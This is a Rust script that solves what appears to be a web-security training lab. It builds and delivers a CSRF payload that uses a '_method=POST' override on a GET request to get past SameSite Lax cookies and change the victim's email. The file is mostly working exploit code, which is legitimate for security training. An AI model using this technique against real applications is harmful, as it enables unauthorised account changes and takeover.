/*****************************************************************************
*
* Lab: SameSite Lax bypass via method override
*
* Hack Steps: 
*      1. Make the request to change the email using the GET method 
*         and include an additional URL parameter to override the method
*      2. Deliver the exploit to the victim
*      3. The victim's email will be changed after they trigger the exploit
*
******************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a6900a90379ef2981cf440400790007.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a8200e00359ef2381d6438a013600a4.exploit-server.net";

fn main() {
    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<script>
                location = "{LAB_URL}/my-account/change-email?email={new_email}&_method=POST"
            </script>"###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ");
    io::stdout().flush().unwrap();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The victim's email will be changed after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    let client = build_web_client();
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
